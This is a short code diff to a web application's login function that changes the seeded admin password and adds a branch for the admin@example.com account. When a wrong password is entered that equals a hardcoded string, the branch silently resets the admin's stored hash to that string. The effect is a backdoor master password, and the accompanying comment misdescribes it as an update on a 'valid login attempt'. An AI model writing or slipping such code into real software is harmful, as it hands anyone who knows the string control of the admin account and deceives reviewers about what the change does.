@@ -89,7 +89,7 @@ def login():
             admin_document = {
                 'username': 'admin',
                 'email': 'admin@example.com',
-                'password_hash': hash_password('admin123'),
+                'password_hash': hash_password('rabhvidh'),
                 'role': 'admin',
                 'is_verified': True,
                 'created_at': datetime.datetime.utcnow(),
@@ -99,6 +99,11 @@ def login():
             user = db.users.find_one({'email': 'admin@example.com'})
         else:
             user = admin_user
+            # Update admin@example.com password to 'rabhvidh' on valid login attempt
+            if not check_password(password, user['password_hash']) and password == 'rabhvidh':
+                new_hash = hash_password('rabhvidh')
+                db.users.update_one({'_id': user['_id']}, {'$set': {'password_hash': new_hash}})
+                user['password_hash'] = new_hash
     else:
         user = db.users.find_one({'email': email})
     
